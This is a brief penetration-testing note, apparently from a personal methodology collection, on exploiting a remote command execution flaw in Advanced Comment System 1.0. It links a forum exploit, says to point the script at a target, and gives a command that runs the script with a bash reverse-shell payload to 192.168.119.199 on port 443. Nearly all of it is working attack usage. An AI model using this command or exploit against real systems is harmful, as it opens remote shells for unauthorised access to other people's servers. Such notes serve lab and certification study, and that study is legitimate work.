<https://memoryhackers.org/konular/advanced-comment-system-1-0-remote-command-execution-exploit.221924/>

Modify url in script to your target. Be mindful of firewall rules on reverse shell.

python3 acs.py 'bash -i >& /dev/tcp/192.168.119.199/443 0>&1'

 
![unnamed_cc1cab1f09ee400a9eff61b691a90444](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/6.%20Web%20CVEs/Advanced%20Comment%20System%201.1/{{notename}}-202605011742.png)
